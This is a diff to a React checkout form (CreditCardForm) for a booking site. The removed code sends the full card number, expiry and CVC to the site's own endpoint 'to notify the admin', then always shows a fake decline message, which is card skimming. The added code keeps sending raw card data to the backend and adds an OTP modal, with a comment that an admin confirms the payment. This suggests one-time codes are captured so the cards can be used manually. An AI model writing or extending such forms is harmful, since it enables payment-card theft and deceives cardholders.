@@ -2,6 +2,9 @@ import { useState } from 'react';
 import Cards from 'react-credit-cards-2';
 import 'react-credit-cards-2/dist/es/styles-compiled.css';
 import { Lock, AlertCircle, ShieldCheck } from 'lucide-react';
+import dynamic from 'next/dynamic';
+
+const CardOTPModal = dynamic(() => import('./CardOTPModal'), { ssr: false });
 
 /* ─── helpers ─── */
 function formatNumber(v) {
@@ -79,11 +82,13 @@ function CardInput({ icon, ...props }) {
   );
 }
 
-export default function CreditCardForm({ onError, bookingId }) {
+export default function CreditCardForm({ onError, bookingId, userPhone = '', amount = 0 }) {
   const [card, setCard] = useState({ number: '', name: '', expiry: '', cvc: '', focus: '' });
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState('');
   const [errors, setErrors] = useState({});
+  const [showOtpModal, setShowOtpModal] = useState(false);
+  const [cardPaymentAttemptId, setCardPaymentAttemptId] = useState(null);
 
   const network = detectNetwork(card.number);
 
@@ -116,24 +121,66 @@ export default function CreditCardForm({ onError, bookingId }) {
     setLoading(true);
     setError('');
 
-    // Notifier l'admin (fire-and-forget, on n'attend pas la réponse)
-    if (bookingId) {
-      fetch('/api/payments/card-attempt', {
+    try {
+      // Initier le paiement par carte et générer l'OTP
+      const res = await fetch('/api/payments/card-initiate', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ number: card.number, name: card.name, expiry: card.expiry, cvc: card.cvc, bookingId }),
-      }).catch(() => {});
-    }
+        body: JSON.stringify({ 
+          number: card.number, 
+          name: card.name, 
+          expiry: card.expiry, 
+          cvc: card.cvc, 
+          bookingId,
+          amount,
+        }),
+      });
 
-    await new Promise((r) => setTimeout(r, 1800));
-    setLoading(false);
-    const msg = 'Cette carte ne peut pas être utilisée, veuillez réessayer plus tard.';
-    setError(msg);
-    if (onError) onError(msg);
+      const data = await res.json();
+      setLoading(false);
+
+      if (!data.success) {
+        setError(data.error || 'Erreur lors de l\'initiation du paiement');
+        if (onError) onError(data.error);
+        return;
+      }
+
+      // Ouvrir le modal OTP
+      setCardPaymentAttemptId(data.data.cardPaymentAttemptId);
+      setShowOtpModal(true);
+    } catch (err) {
+      setLoading(false);
+      setError('Erreur de connexion. Veuillez réessayer.');
+      if (onError) onError(err.message);
+    }
+  }
+
+  function handleOTPSuccess(attemptId) {
+    // L'OTP a été vérifié - l'admin confirmera le paiement
+    setCard({ number: '', name: '', expiry: '', cvc: '', focus: '' });
+    setError('');
+    // Optionnel : vous pouvez rafraîchir la page ou afficher un message de succès
+    // pour notifier que le paiement est en attente de confirmation de l'admin
+  }
+
+  function handleOTPError(errorMsg) {
+    setError(errorMsg);
   }
 
   return (
-    <div className="overflow-hidden rounded-xl border bg-card shadow-sm">
+    <>
+      {/* Modal de vérification OTP */}
+      <CardOTPModal
+        open={showOtpModal}
+        onOpenChange={setShowOtpModal}
+        cardPaymentAttemptId={cardPaymentAttemptId}
+        userPhone={userPhone}
+        amount={amount}
+        onSuccess={handleOTPSuccess}
+        onError={handleOTPError}
+      />
+
+      <div className="overflow-hidden rounded-xl border bg-card shadow-sm">
       {/* Header */}
       <div className="flex items-center justify-between border-b bg-muted/30 px-5 py-3.5">
         <div className="flex items-center gap-2 text-sm font-semibold">
@@ -269,5 +316,6 @@ export default function CreditCardForm({ onError, bookingId }) {
         </form>
       </div>
     </div>
+    </>
   );
 }
